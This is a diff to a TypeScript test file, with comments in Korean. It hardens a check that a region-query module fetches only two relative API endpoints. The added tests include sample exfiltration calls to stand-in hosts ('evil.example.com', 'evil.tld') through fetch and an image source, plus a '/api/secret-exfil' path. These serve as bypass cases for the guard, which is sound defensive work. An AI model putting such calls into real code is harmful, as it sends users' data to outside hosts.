@@ -211,6 +211,26 @@ describe("네트워크 요청 없음", () => {
   });
 });
 
+/**
+ * 파일 안의 모든 `fetch(...)` 호출에서, 인자로 **바로 적힌 문자열
+ * 리터럴의 시작 부분**을 뽑는다. 따옴표·백틱 세 종류를 모두 본다.
+ *
+ * 뽑는 것이 "URL 전체"가 아니라 "리터럴의 앞부분"인 이유: 이 저장소의
+ * 호출은 `fetch("/api/complexes?" + params)`처럼 리터럴 뒤에 값을 이어
+ * 붙인다. 검사하려는 것은 **어디로 나가는가**이고 그건 리터럴의 맨
+ * 앞(스킴/호스트/경로 시작)이 정한다 — 뒤에 무엇이 붙든 `/api/...`로
+ * 시작하면 같은 출처의 그 경로로 간다.
+ *
+ * 리터럴이 아예 없는 호출(`fetch(url)`)은 두 번째 캡처가 비어 매치돼,
+ * 아래 검사에서 "상대경로로 시작하지 않는다"로 걸린다 — 변수로 감싸
+ * 빠져나가는 길을 열어 두지 않는다.
+ */
+function fetchCallLiterals(content: string): string[] {
+  return [...content.matchAll(/\bfetch\s*\(\s*(?:(["'`])([^"'`]*)|([^\s"'`)]*))/g)].map(
+    (m) => m[2] ?? m[3] ?? "",
+  );
+}
+
 describe("regionQuery 예외", () => {
   const REGION_QUERY_PATH = "src/lib/regionQuery.ts";
 
@@ -235,10 +255,78 @@ describe("regionQuery 예외", () => {
     }
   });
 
-  it("regionQuery.ts는 상대경로 /api/complexes 외 다른 곳으로 요청하지 않는다", () => {
+  /**
+   * 이 파일이 정당하게 부르는 두 엔드포인트. **둘 다 상대경로다** —
+   * `loadNaverMaps.ts`와 달리 이 파일은 외부 호스트를 부를 일이 아예
+   * 없으므로, 가드의 모양도 다르다: 저기서는 "허용된 origin인가"를 묻지만
+   * 여기서는 "**호스트가 아예 없는가**(=상대경로인가)"를 묻는다.
+   */
+  const ALLOWED_ENDPOINTS = ["/api/complexes", "/api/geocode"];
+
+  it("regionQuery.ts의 fetch는 전부 상대경로이고, 그 경로는 알려진 엔드포인트뿐이다", () => {
     const content = readFileSync(REGION_QUERY_PATH, "utf8");
-    expect(content).toContain('"/api/complexes');
-    expect(content).not.toMatch(/https?:\/\//);
+    const literals = fetchCallLiterals(content);
+
+    // 그물이 비어 있지 않은지 핀 고정 — 호출을 못 찾으면 아래 루프가
+    // 통째로 공허하게 통과한다.
+    expect(literals.length).toBeGreaterThan(0);
+
+    const endpoints = new Set<string>();
+    for (const literal of literals) {
+      // 절대 URL(`https://host/...`)도, 프로토콜 상대 URL(`//host/...`)도
+      // 안 된다. 후자는 브라우저가 `https://host/...`와 똑같이 다룬다.
+      expect(literal.startsWith("/"), `fetch(${literal}…)가 상대경로가 아니다`).toBe(true);
+      expect(literal.startsWith("//"), `fetch(${literal}…)가 프로토콜 상대 URL이다`).toBe(false);
+      endpoints.add(literal.split("?")[0]!);
+    }
+
+    expect([...endpoints].sort()).toEqual([...ALLOWED_ENDPOINTS].sort());
+  });
+
+  it("regionQuery.ts에는 절대 URL·프로토콜 상대 URL 리터럴이 하나도 없다", () => {
+    // fetch 인자만 보면 `new Image().src = "//evil.tld/x"` 같은 다른
+    // 유출 경로를 놓친다. 이 파일 전체에 호스트가 붙은 URL 리터럴이
+    // 하나도 없어야 한다 — 이 파일이 나갈 곳은 자기 자신의 출처뿐이다.
+    const content = readFileSync(REGION_QUERY_PATH, "utf8");
+    expect(urlOriginsIn(content).map(({ raw }) => raw)).toEqual([]);
+  });
+
+  it("정규식이 놓친 스킴 리터럴도 남아있으면 안 된다", () => {
+    // loadNaverMaps.ts 가드와 같은 2층 구조다: 위 두 검사는 정규식이
+    // 매치한 것만 본다. 문자열 접합·템플릿 보간·percent-encoding으로
+    // 리터럴이 쪼개지면 정규식이 아예 매치하지 않아 검사 자체가 돌지
+    // 않으므로, 정규식 도입 전의 뭉뚝한 검사를 마지막 층으로 남긴다.
+    const content = readFileSync(REGION_QUERY_PATH, "utf8");
+    expect(content, "스킴 리터럴이 남아 있다").not.toMatch(/https?:\/\//);
+  });
+
+  describe("가드 핀 고정 — 예전 뭉뚝한 검사가 놓쳤던 모양 재현", () => {
+    // 고치기 전 가드는 `content.toContain('"/api/complexes')` +
+    // `not.toMatch(/https?:\/\//)`뿐이었다. `/api/complexes`만 어딘가에
+    // 있으면 그 옆에서 어디로 나가든 통과했고, `//host/...`는 스킴이
+    // 없어 뭉뚝한 검사에도 안 걸렸다.
+    const BYPASSES = [
+      'const res = await fetch("//evil.example.com/x");',
+      'const res = await fetch("https://evil.example.com/x");',
+      'const res = await fetch(untrustedUrl);',
+      'const res = await fetch("/api/secret-exfil");',
+    ];
+
+    it.each(BYPASSES)("이제는 잡아낸다: %s", (snippet) => {
+      const literals = fetchCallLiterals(snippet);
+      expect(literals.length).toBeGreaterThan(0);
+      const ok = literals.every(
+        (l) => l.startsWith("/") && !l.startsWith("//") && ALLOWED_ENDPOINTS.includes(l.split("?")[0]!),
+      );
+      expect(ok).toBe(false);
+    });
+
+    it("정당한 두 엔드포인트 호출은 통과시킨다", () => {
+      const literals = fetchCallLiterals(
+        'await fetch("/api/complexes?" + params.toString());\nawait fetch(`/api/geocode?${params.toString()}`);',
+      );
+      expect(literals.map((l) => l.split("?")[0])).toEqual(ALLOWED_ENDPOINTS);
+    });
   });
 });
 
